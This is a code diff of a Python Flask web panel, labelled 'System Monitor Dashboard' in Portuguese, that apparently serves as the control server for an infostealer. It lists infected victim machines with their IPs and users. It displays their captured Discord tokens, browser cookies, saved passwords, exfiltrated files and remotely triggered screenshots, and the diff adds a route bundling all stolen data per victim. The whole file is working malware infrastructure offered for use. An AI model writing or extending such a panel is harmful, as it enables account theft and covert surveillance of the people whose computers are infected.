@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-System Monitor Dashboard - Versão ORIGINAL com Novos Endpoints
+System Monitor Dashboard - Versão ORIGINAL COMPLETA
 """
 
 import os
@@ -381,9 +381,29 @@ def get_files_data():
     
     return jsonify(endpoint_files)
 
-# Template HTML ORIGINAL
-HTML_TEMPLATE = """
-<!DOCTYPE html>
+# ENPOINT ADICIONAL PARA DADOS COMPLETOS DO ENDPOINT
+@app.route('/api/endpoint_data/<endpoint_id>', methods=['GET', 'OPTIONS'])
+def get_endpoint_data(endpoint_id):
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        # Compila todos os dados do endpoint
+        endpoint_data = {
+            'system': endpoints.get(endpoint_id, {}),
+            'tokens': endpoint_tokens.get(endpoint_id, {}),
+            'cookies': endpoint_cookies.get(endpoint_id, {}),
+            'passwords': endpoint_passwords.get(endpoint_id, {}),
+            'files': endpoint_files.get(endpoint_id, {}),
+            'screenshots': {endpoint_id: endpoint_screenshots.get(endpoint_id, {})}
+        }
+        
+        return jsonify(endpoint_data)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# Template HTML ORIGINAL COMPLETO
+HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -559,9 +579,140 @@ HTML_TEMPLATE = """
         .refresh-btn:hover {
             transform: scale(1.1);
         }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .modal-content {
+            background: linear-gradient(135deg, rgba(17, 17, 27, 0.95) 0%, rgba(31, 31, 46, 0.95) 100%);
+            margin: 10% auto;
+            padding: 20px;
+            border-radius: 16px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+        }
+        .modal-title {
+            color: #a855f7;
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+        .modal-close {
+            color: #6b7280;
+            font-size: 28px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        .modal-close:hover {
+            color: #e0e0e0;
+        }
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .menu-item {
+            background: rgba(124, 58, 237, 0.1);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .menu-item:hover {
+            background: rgba(124, 58, 237, 0.2);
+            transform: translateY(-3px);
+        }
+        .menu-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        .menu-title {
+            color: #a855f7;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        .menu-desc {
+            color: #9ca3af;
+            font-size: 0.9rem;
+        }
+        .data-content {
+            display: none;
+        }
+        .data-content.active {
+            display: block;
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .card-title {
+            color: #a855f7;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        .status-badge {
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        .status-badge.online {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+        }
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 5px 0;
+        }
+        .info-label {
+            color: #9ca3af;
+            font-size: 0.9rem;
+        }
+        .info-value {
+            color: #e0e0e0;
+            font-weight: 500;
+        }
+        .btn-dados {
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+        .btn-dados:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
+        }
     </style>
 </head>
 <body>
+    <canvas id="particles-canvas"></canvas>
     <div class="container">
         <div class="header">
             <h1>System Monitor</h1>
@@ -616,15 +767,145 @@ HTML_TEMPLATE = """
         <div id="data" class="tab-content">
             <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
             <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
+                <div class="menu-grid" id="menuPrincipal">
+                    <div class="menu-item" onclick="showDataCategory('tokens')">
+                        <div class="menu-icon">🔑</div>
+                        <div class="menu-title">Tokens</div>
+                        <div class="menu-desc">Discord e outras contas</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('cookies')">
+                        <div class="menu-icon">🍪</div>
+                        <div class="menu-title">Cookies</div>
+                        <div class="menu-desc">Sessões de navegador</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('passwords')">
+                        <div class="menu-icon">🔒</div>
+                        <div class="menu-title">Senhas</div>
+                        <div class="menu-desc">Logins salvos</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('files')">
+                        <div class="menu-icon">📁</div>
+                        <div class="menu-title">Arquivos</div>
+                        <div class="menu-desc">Documentos e downloads</div>
+                    </div>
                 </div>
-                
-                <div id="dataContent" style="min-height: 400px;">
-                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
+
+                <div id="tokensContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🔑 Tokens Capturados</h3>
+                        <div id="tokensList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="cookiesContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🍪 Cookies do Navegador</h3>
+                        <div id="cookiesList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="passwordsContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🔒 Senhas Salvas</h3>
+                        <div id="passwordsList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="filesContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>📁 Arquivos</h3>
+                        <div id="filesList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Menu de Dados -->
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title" id="modalTitle">📊 Menu de Dados</div>
+                <span class="modal-close" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <!-- Menu Principal -->
+                <div id="menuPrincipal" class="menu-grid">
+                    <div class="menu-item" onclick="showDataCategory('tokens')">
+                        <div class="menu-icon">🔑</div>
+                        <div class="menu-title">Tokens</div>
+                        <div class="menu-desc">Discord e outras contas</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('cookies')">
+                        <div class="menu-icon">🍪</div>
+                        <div class="menu-title">Cookies</div>
+                        <div class="menu-desc">Sessões de navegador</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('passwords')">
+                        <div class="menu-icon">🔒</div>
+                        <div class="menu-title">Senhas</div>
+                        <div class="menu-desc">Logins salvos</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('files')">
+                        <div class="menu-icon">📁</div>
+                        <div class="menu-title">Arquivos</div>
+                        <div class="menu-desc">Documentos e downloads</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('system')">
+                        <div class="menu-icon">🖥️</div>
+                        <div class="menu-title">Sistema</div>
+                        <div class="menu-desc">Informações do PC</div>
+                    </div>
+                    <div class="menu-item" onclick="showDataCategory('screenshot')">
+                        <div class="menu-icon">📸</div>
+                        <div class="menu-title">Screenshot</div>
+                        <div class="menu-desc">Tela do PC</div>
+                    </div>
+                </div>
+
+                <!-- Conteúdo das Categorias -->
+                <div id="tokensContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🔑 Tokens Capturados</h3>
+                        <div id="tokensList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="cookiesContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🍪 Cookies do Navegador</h3>
+                        <div id="cookiesList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="passwordsContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🔒 Senhas Salvas</h3>
+                        <div id="passwordsList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="filesContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>📁 Arquivos</h3>
+                        <div id="filesList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="systemContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>🖥️ Informações do Sistema</h3>
+                        <div id="systemList"><div class="empty-state">Carregando...</div></div>
+                    </div>
+                </div>
+                <div id="screenshotDataContent" class="data-content">
+                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
+                    <div class="data-section">
+                        <h3>📸 Screenshots Capturadas</h3>
+                        <div id="screenshotData"><div class="empty-state">Carregando...</div></div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -633,214 +914,204 @@ HTML_TEMPLATE = """
     <button class="refresh-btn" onclick="loadAllData()">🔄</button>
 
     <script>
-        let currentEndpoint = null;
-        let currentCategory = null;
+        // Partículas
+        const canvas = document.getElementById('particles-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
 
-        function showTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(content => {
-                content.classList.remove('active');
-            });
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            document.getElementById(tabName).classList.add('active');
-            event.target.classList.add('active');
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 0.5;
+                this.speedX = Math.random() * 0.5 - 0.25;
+                this.speedY = Math.random() * 0.5 - 0.25;
+                this.opacity = Math.random() * 0.5 + 0.1;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x > canvas.width) this.x = 0;
+                if (this.x < 0) this.x = canvas.width;
+                if (this.y > canvas.height) this.y = 0;
+                if (this.y < 0) this.y = canvas.height;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(168, 85, 247, ${this.opacity})`;
+                ctx.fill();
+            }
         }
 
-        function showDataCategory(category) {
-            currentCategory = category;
-            const contentDiv = document.getElementById('dataContent');
-            
-            switch(category) {
-                case 'tokens':
-                    loadTokens();
-                    break;
-                case 'cookies':
-                    loadCookies();
-                    break;
-                case 'passwords':
-                    loadPasswords();
-                    break;
-                case 'files':
-                    loadFiles();
-                    break;
-            }
+        function initParticles() {
+            particles = [];
+            const count = Math.min(100, Math.floor((canvas.width * canvas.height) / 15000));
+            for (let i = 0; i < count; i++) particles.push(new Particle());
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            requestAnimationFrame(animateParticles);
+        }
+
+        initParticles();
+        animateParticles();
+
+        // Variáveis globais
+        let currentEndpointId = null;
+        let currentEndpointData = null;
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
         }
 
         async function loadEndpoints() {
             try {
-                const response = await fetch('/api/endpoints');
-                const endpoints = await response.json();
-                
+                const res = await fetch('/api/endpoints');
+                const endpoints = await res.json();
                 const container = document.getElementById('endpointsList');
-                container.innerHTML = '';
-                
-                Object.values(endpoints).forEach(endpoint => {
-                    const div = document.createElement('div');
-                    div.className = 'card';
-                    div.innerHTML = \`
-                        <h3>\${endpoint.hostname}</h3>
-                        <p><strong>ID:</strong> \${endpoint.id}</p>
-                        <p><strong>Usuário:</strong> \${endpoint.user}</p>
-                        <p><strong>IP Local:</strong> \${endpoint.ip_address}</p>
-                        <p><strong>IP Externo:</strong> \${endpoint.external_ip}</p>
-                        <p><strong>Plataforma:</strong> \${endpoint.platform}</p>
-                        <p><strong>RAM:</strong> \${endpoint.ram}</p>
-                        <p><strong>Status:</strong> 🟢 Online</p>
-                        <p><strong>Visto:</strong> \${endpoint.last_seen}</p>
-                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('\${endpoint.id}')">📸 Screenshot</button>
-                    \`;
-                    container.appendChild(div);
-                });
-                
-                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
-                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
-                
-                // Atualiza o select de endpoints
                 const select = document.getElementById('endpointSelect');
-                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
-                Object.keys(endpoints).forEach(id => {
-                    const option = document.createElement('option');
-                    option.value = id;
-                    option.textContent = \`\${endpoints[id].hostname} (\${id})\`;
-                    select.appendChild(option);
-                });
-            } catch (error) {
-                console.error('Error loading endpoints:', error);
+
+                if (endpoints.length === 0) {
+                    container.innerHTML = '<div style="color: #6b7280; text-align: center; padding: 40px;">Nenhum endpoint conectado</div>';
+                    return;
+                }
+
+                let selectHtml = '<option value="">Selecione um endpoint...</option>';
+                container.innerHTML = endpoints.map(e => {
+                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
+                    return `<div class="card">
+                        <div class="card-header">
+                            <span class="card-title">${e.hostname}</span>
+                            <span class="status-badge ${e.status}">${e.status}</span>
+                        </div>
+                        <div class="card-info">
+                            <div class="info-item"><span class="info-label">Usuario</span><span class="info-value">${e.user}</span></div>
+                            <div class="info-item"><span class="info-label">IP Local</span><span class="info-value">${e.ip_address}</span></div>
+                            <div class="info-item"><span class="info-label">IP Externo</span><span class="info-value">${e.external_ip}</span></div>
+                            <div class="info-item"><span class="info-label">Plataforma</span><span class="info-value">${e.platform}</span></div>
+                            <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
+                            <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
+                        </div>
+                        <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Dados</button>
+                    </div>`;
+                }).join('');
+
+                select.innerHTML = selectHtml;
+            } catch(e) {}
+        }
+
+        async function openDataModal(endpointId, hostname) {
+            currentEndpointId = endpointId;
+            document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
+            document.getElementById('dataModal').style.display = 'block';
+            showMenu();
+
+            // Carrega os dados
+            try {
+                const res = await fetch(`/api/endpoint_data/${endpointId}`);
+                currentEndpointData = await res.json();
+            } catch(e) {
+                console.error('Erro ao carregar dados:', e);
             }
         }
 
-        async function loadTokens() {
-            try {
-                const response = await fetch('/api/tokens_data');
-                const tokens = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
-                
-                const tokensList = document.getElementById('tokensList');
-                tokensList.innerHTML = '';
-                
-                Object.entries(tokens).forEach(([endpoint_id, data]) => {
-                    data.tokens.forEach(token => {
-                        const div = document.createElement('div');
-                        div.className = 'token-card';
-                        div.innerHTML = \`
-                            <strong>Endpoint:</strong> \${endpoint_id}<br>
-                            <strong>Token:</strong> \${token.token || 'N/A'}<br>
-                            <strong>Válido:</strong> \${token.valid ? '✅' : '❌'}<br>
-                            \${token.account ? \`<strong>Usuário:</strong> \${token.account.username}#\${token.account.discriminator}<br>\` : ''}
-                        \`;
-                        tokensList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(tokens).length === 0) {
-                    tokensList.innerHTML = '<div class="empty-state">Nenhum token encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading tokens:', error);
-            }
+        function closeModal() {
+            document.getElementById('dataModal').style.display = 'none';
+            currentEndpointId = null;
+            currentEndpointData = null;
         }
 
-        async function loadCookies() {
-            try {
-                const response = await fetch('/api/cookies_data');
-                const cookies = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies do Navegador</h3><div id="cookiesList"></div></div>';
-                
-                const cookiesList = document.getElementById('cookiesList');
-                cookiesList.innerHTML = '';
-                
-                Object.entries(cookies).forEach(([endpoint_id, data]) => {
-                    data.cookies.forEach(cookie => {
-                        const div = document.createElement('div');
-                        div.className = 'cookie-card';
-                        div.innerHTML = \`
-                            <strong>Endpoint:</strong> \${endpoint_id}<br>
-                            <strong>Host:</strong> \${cookie.host}<br>
-                            <strong>Nome:</strong> \${cookie.name}<br>
-                            <strong>Valor:</strong> \${cookie.value.substring(0, 100)}\${cookie.value.length > 100 ? '...' : ''}<br>
-                        \`;
-                        cookiesList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(cookies).length === 0) {
-                    cookiesList.innerHTML = '<div class="empty-state">Nenhum cookie encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading cookies:', error);
-            }
+        function showMenu() {
+            document.getElementById('menuPrincipal').style.display = 'grid';
+            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
         }
 
-        async function loadPasswords() {
-            try {
-                const response = await fetch('/api/passwords_data');
-                const passwords = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Salvas</h3><div id="passwordsList"></div></div>';
-                
-                const passwordsList = document.getElementById('passwordsList');
-                passwordsList.innerHTML = '';
-                
-                Object.entries(passwords).forEach(([endpoint_id, data]) => {
-                    data.passwords.forEach(password => {
-                        const div = document.createElement('div');
-                        div.className = 'password-card';
-                        div.innerHTML = \`
-                            <strong>Endpoint:</strong> \${endpoint_id}<br>
-                            <strong>Navegador:</strong> \${password.browser}<br>
-                            <strong>URL:</strong> \${password.url}<br>
-                            <strong>Usuário:</strong> \${password.username}<br>
-                            <strong>Senha:</strong> \${password.password}<br>
-                        \`;
-                        passwordsList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(passwords).length === 0) {
-                    passwordsList.innerHTML = '<div class="empty-state">Nenhuma senha encontrada</div>';
-                }
-            } catch (error) {
-                console.error('Error loading passwords:', error);
-            }
-        }
+        function showDataCategory(category) {
+            document.getElementById('menuPrincipal').style.display = 'none';
+            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
 
-        async function loadFiles() {
-            try {
-                const response = await fetch('/api/files_data');
-                const files = await response.json();
-                
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Recebidos</h3><div id="filesList"></div></div>';
-                
-                const filesList = document.getElementById('filesList');
-                filesList.innerHTML = '';
-                
-                Object.entries(files).forEach(([endpoint_id, data]) => {
-                    data.files.forEach(file => {
-                        const div = document.createElement('div');
-                        div.className = 'token-card';
-                        div.innerHTML = \`
-                            <strong>Endpoint:</strong> \${endpoint_id}<br>
-                            <strong>Nome:</strong> \${file.name || file.filename}<br>
-                            <strong>Tamanho:</strong> \${file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'N/A'}<br>
-                            <strong>Tipo:</strong> \${file.type || file.content_type}<br>
-                        \`;
-                        filesList.appendChild(div);
-                    });
-                });
-                
-                if (Object.keys(files).length === 0) {
-                    filesList.innerHTML = '<div class="empty-state">Nenhum arquivo encontrado</div>';
-                }
-            } catch (error) {
-                console.error('Error loading files:', error);
+            if (!currentEndpointData) return;
+
+            const data = currentEndpointData;
+
+            switch(category) {
+                case 'tokens':
+                    const tokens = data.tokens?.tokens || [];
+                    const tokensHtml = tokens.length > 0 
+                        ? tokens.map(t => `<div class="token-card">${t.token || t}</div>`).join('')
+                        : '<div class="empty-state">Nenhum token capturado</div>';
+                    document.getElementById('tokensList').innerHTML = tokensHtml;
+                    document.getElementById('tokensContent').classList.add('active');
+                    break;
+
+                case 'cookies':
+                    const cookies = data.cookies?.cookies || [];
+                    const cookiesHtml = cookies.length > 0
+                        ? cookies.map(c => `<div class="cookie-card">${c.domain || ''}: ${c.name || c}</div>`).join('')
+                        : '<div class="empty-state">Nenhum cookie capturado</div>';
+                    document.getElementById('cookiesList').innerHTML = cookiesHtml;
+                    document.getElementById('cookiesContent').classList.add('active');
+                    break;
+
+                case 'passwords':
+                    const passwords = data.passwords?.passwords || [];
+                    const passwordsHtml = passwords.length > 0
+                        ? passwords.map(p => `<div class="password-card">${p.url || ''}: ${p.username || ''} / ${p.password || p}</div>`).join('')
+                        : '<div class="empty-state">Nenhuma senha capturada</div>';
+                    document.getElementById('passwordsList').innerHTML = passwordsHtml;
+                    document.getElementById('passwordsContent').classList.add('active');
+                    break;
+
+                case 'files':
+                    const files = data.files?.files || [];
+                    const filesHtml = files.length > 0
+                        ? files.map(f => `<div class="token-card">${f.name || f.filename}: ${(f.size / 1024).toFixed(2)} KB</div>`).join('')
+                        : '<div class="empty-state">Nenhum arquivo encontrado</div>';
+                    document.getElementById('filesList').innerHTML = filesHtml;
+                    document.getElementById('filesContent').classList.add('active');
+                    break;
+
+                case 'system':
+                    const systemHtml = data.system ? `
+                        <div class="token-card">
+                            <strong>Hostname:</strong> ${data.system.hostname || 'N/A'}<br>
+                            <strong>Usuário:</strong> ${data.system.user || 'N/A'}<br>
+                            <strong>IP Local:</strong> ${data.system.ip_address || 'N/A'}<br>
+                            <strong>IP Externo:</strong> ${data.system.external_ip || 'N/A'}<br>
+                            <strong>Plataforma:</strong> ${data.system.platform || 'N/A'}<br>
+                            <strong>RAM:</strong> ${data.system.ram || 'N/A'}<br>
+                        </div>
+                    ` : '<div class="empty-state">Dados do sistema não disponíveis</div>';
+                    document.getElementById('systemList').innerHTML = systemHtml;
+                    document.getElementById('systemContent').classList.add('active');
+                    break;
+
+                case 'screenshot':
+                    const screenshots = data.screenshots?.screenshots || [];
+                    const screenshotsHtml = screenshots.length > 0
+                        ? screenshots.map(s => `
+                            <div class="token-card">
+                                <strong>Data:</strong> ${new Date(s.timestamp).toLocaleString()}<br>
+                                <img src="data:image/png;base64,${s.image}" style="max-width: 100%; border-radius: 8px; margin-top: 10px;" alt="Screenshot">
+                            </div>
+                        `).join('')
+                        : '<div class="empty-state">Nenhuma screenshot encontrada</div>';
+                    document.getElementById('screenshotData').innerHTML = screenshotsHtml;
+                    document.getElementById('screenshotDataContent').classList.add('active');
+                    break;
             }
         }
 
@@ -848,22 +1119,22 @@ HTML_TEMPLATE = """
             try {
                 const response = await fetch('/api/screenshots');
                 const screenshots = await response.json();
-                
+
                 const container = document.getElementById('screenContent');
                 container.innerHTML = '';
-                
+
                 Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                     const div = document.createElement('div');
-                    div.innerHTML = \`
-                        <h3 style="color: #a855f7; margin-bottom: 15px;">\${endpoint_id}</h3>
-                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> \${new Date(screenshot.timestamp).toLocaleString()}</p>
-                        \${screenshot.image ? \`<img src="data:image/png;base64,\${screenshot.image}" class="screenshot-img" alt="Screenshot">\` : ''}
-                    \`;
+                    div.innerHTML = `
+                        <h3 style="color: #a855f7; margin-bottom: 15px;">${endpoint_id}</h3>
+                        <p style="color: #9ca3af; margin-bottom: 15px;"><strong>Data:</strong> ${new Date(screenshot.timestamp).toLocaleString()}</p>
+                        ${screenshot.image ? `<img src="data:image/png;base64,${screenshot.image}" class="screenshot-img" alt="Screenshot">` : ''}
+                    `;
                     container.appendChild(div);
                 });
-                
+
                 document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
-                
+
                 if (Object.keys(screenshots).length === 0) {
                     container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
                 }
@@ -876,7 +1147,7 @@ HTML_TEMPLATE = """
             const select = document.getElementById('endpointSelect');
             currentEndpoint = select.value;
             const btn = document.getElementById('screenshotBtn');
-            
+
             if (currentEndpoint) {
                 btn.disabled = false;
                 btn.style.opacity = '1';
@@ -892,13 +1163,13 @@ HTML_TEMPLATE = """
                 alert('Selecione um endpoint primeiro');
                 return;
             }
-            
+
             try {
-                const response = await fetch(\`/api/request_screenshot/\${id}\`, { method: 'POST' });
+                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
                 const result = await response.json();
-                
+
                 if (result.status === 'success') {
-                    alert(\`Screenshot solicitado para \${id}!\`);
+                    alert(`Screenshot solicitado para ${id}!`);
                     // Verifica novamente após 5 segundos
                     setTimeout(() => {
                         loadScreenshots();
@@ -907,7 +1178,7 @@ HTML_TEMPLATE = """
                         }
                     }, 5000);
                 } else {
-                    alert(\`Erro: \${result.message}\`);
+                    alert(`Erro: ${result.message}`);
                 }
             } catch (error) {
                 alert('Erro ao solicitar screenshot');
@@ -917,7 +1188,7 @@ HTML_TEMPLATE = """
         function loadAllData() {
             loadEndpoints();
             loadScreenshots();
-            
+
             // Carrega métricas totais
             fetch('/api/metrics_data')
                 .then(response => response.json())
@@ -929,14 +1200,14 @@ HTML_TEMPLATE = """
 
         // Carrega dados iniciais
         loadAllData();
-        
+
         // Atualiza a cada 30 segundos
         setInterval(loadAllData, 30000);
-        
+
         // Verifica screenshots solicitadas a cada 10 segundos
         setInterval(() => {
             if (currentEndpoint) {
-                fetch(\`/api/screenshot_requests/\${currentEndpoint}\`)
+                fetch(`/api/screenshot_requests/${currentEndpoint}`)
                     .then(response => response.json())
                     .then(data => {
                         if (data.request_screenshot) {
@@ -952,8 +1223,8 @@ HTML_TEMPLATE = """
 """
 
 if __name__ == '__main__':
-    print("🚀 Iniciando System Monitor ORIGINAL...")
-    print("📡 Endpoints disponíveis:")
+    print("Iniciando System Monitor ORIGINAL...")
+    print("Endpoints disponíveis:")
     print("   - POST /api/register")
     print("   - POST /api/metrics")
     print("   - POST /api/tokens")
@@ -969,6 +1240,7 @@ if __name__ == '__main__':
     print("   - GET  /api/cookies_data")
     print("   - GET  /api/passwords_data")
     print("   - GET  /api/screenshots")
+    print("   - GET  /api/endpoint_data/<id>")
     print()
     
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
